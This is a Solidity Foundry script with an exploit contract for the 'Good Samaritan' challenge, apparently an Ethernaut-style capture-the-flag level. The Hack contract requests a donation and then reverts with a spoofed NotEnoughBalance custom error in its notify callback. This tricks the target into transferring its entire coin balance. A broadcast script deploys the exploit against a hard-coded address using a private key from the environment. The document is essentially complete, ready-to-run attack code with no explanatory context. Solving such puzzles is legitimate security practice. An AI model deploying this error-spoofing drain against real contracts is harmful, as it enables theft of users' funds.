pragma solidity ^0.8;
import "forge-std/Script.sol";


interface IGood {
    function coin() external view returns (address);
    function requestDonation() external returns (bool enoughBalance);
}

interface ICoin {
    function balances(address) external view returns (uint256);
}

contract Hack {
    IGood private immutable target;
    ICoin private immutable coin;

    error NotEnoughBalance();

    constructor(IGood _target) {
        target = _target;
        coin = ICoin(_target.coin());
    }

    function pwn() external {
        target.requestDonation();
        require(coin.balances(address(this)) == 10 ** 6, "hack failed");
    }

    function notify(uint256 amount) external {
        if (amount == 10) {
            revert NotEnoughBalance();
        }
    }
}

contract GoodSamaritanScript is Script {
    function run() external {
        address goodAddr = 0xBe2D9fc1CC3adE8b64C9A304DEfc905C063F56Af; // Replace with actual contract address
        IGood target = IGood(goodAddr);
        
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        Hack hack = new Hack(target);
        hack.pwn();
        vm.stopBroadcast();
    }
}